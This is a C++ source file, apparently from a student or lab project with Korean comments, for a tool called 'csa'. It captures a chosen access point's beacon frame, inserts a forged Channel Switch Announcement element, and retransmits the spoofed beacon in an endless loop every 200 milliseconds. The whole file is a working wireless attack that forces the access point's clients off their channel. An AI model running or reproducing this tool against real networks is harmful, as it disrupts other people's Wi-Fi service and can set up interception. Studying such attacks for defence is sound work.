#include "mac.h"
#include "pch.h"
#include "handler.h"
#include "macframe.h"
#include "management.h"
#include "ie.h"
#include "radiotap.h"
#include "config.h"
#include "packet_utils.h"

void usage()
{
    std::cout << "Usage: ./csa <interface> <ap_mac> " << std::endl;
}

int check_args(int argc, char* argv[])
{
    if (argc != 3) {
        usage();
        return EXIT_FAILURE;
    }
    return EXIT_SUCCESS;
}



int main(int argc, char* argv[]) {
    if (check_args(argc, argv) == EXIT_FAILURE) {
        return EXIT_FAILURE ;
    }
    //==========Config initialization==========

    Config config;
    config.interface = argv[1];
    config.ap_mac = Mac(argv[2]);

    //==========PCAP initialization==========

    char errbuf[PCAP_ERRBUF_SIZE];
    pcap_t* pcap = handle_init(config.interface.c_str(), errbuf);
    if(pcap == nullptr) 
    {
        return EXIT_FAILURE;
    }
    //=========Find target AP's beacon frame=========
    
    const u_char* packet;
    int total_packet_len;
    packet = find_target_beacon(pcap, &config, &total_packet_len);

    // RadioTap v
    ieee80211_radiotap_header* radiotap_header = (ieee80211_radiotap_header*) packet;
    size_t radiotap_len = radiotap_header->it_len;

    ieee80211_mac_header* mac_header = (ieee80211_mac_header*)(packet + radiotap_len);
    size_t mac_header_len = sizeof(ieee80211_mac_header); // TODO : MAC Header 길이 계산 (QoS, HT 등 옵션에 따라 달라질 수 있음)

    // ============================= Make CSA frame =============================

    std::cout << "Current Channel: " << config.ap_current_channel << std::endl;
    int switchChannel = setSwitchChannel(config.ap_current_channel);
    channel_switch_announcement_ie csa_ie = create_channel_switch_announcement_ie(switchChannel, CSA_COUNT);

    InsertData csa_insert = 
    {
        .pos = find_ie_end_by_tag(ieee80211_IE::SSID, packet, radiotap_len, mac_header_len, sizeof(beacon_frame_body), total_packet_len),
        .data = reinterpret_cast<const uint8_t*>(&csa_ie),
        .len = sizeof(csa_ie)
    };
    std::vector<InsertData> insert_data = { csa_insert };


    // ============================= Parse beacon frame body  =============================

    beacon_frame_body* frame_body = (beacon_frame_body*)(packet + radiotap_len + mac_header_len);



    //============================= 패킷 생성 =============================

    size_t new_packet_len = 0;
    u_char* new_packet = inject_data_into_packet(packet, total_packet_len, insert_data, new_packet_len);


    //============================= 패킷 조정 =============================
    //FCS 제거 (Radiotap의 FCS 비트 확인 후, FCS가 포함된 패킷이면 마지막 4바이트 제거)
    std::cout << "isFCS(packet) = " << isFCS(packet) << std::endl;
    std::cout << "before trim new_packet_len = " << new_packet_len << std::endl;
    if (isFCS(packet))
    {
        std::cout << "FCS detected, removing FCS from packet" << std::endl;
        new_packet_len -= 4;
        std::cout << "after trim new_packet_len = " << new_packet_len << std::endl;
    }

    // 디버깅
    dump(new_packet, new_packet_len);

    // //=====================================================================

    // //============CSA 프레임 송신 ===========
    int cnt = 1;
    while (true)
    {
        int res = pcap_sendpacket(pcap, new_packet, new_packet_len);
        if (res != 0) {
            std::cerr << "pcap_sendpacket error: " << pcap_geterr(pcap) << std::endl;
        }
        else{
            std::cout << "Sent CSA frame to AP " << cnt << ": " << (std::string)config.ap_mac << " to switch to channel " << (int)csa_ie.new_channel_number << std::endl;
        }
        cnt++;

        updateSN(new_packet);
        int count = updateCSACount(new_packet);
        std::cout << count << "번 전송 후 CSA Count 감소" << std::endl;

        if(count ==0) 
        {
            std::cout << "CSA Count reached 0, 잠시 대기후 다시 처음부터 전송" << std::endl;
            usleep(3000000); // 3초 대기
            continue;

        }
        usleep(200000); //1초마다 전송
    }

    delete[] new_packet;
    return 0;
}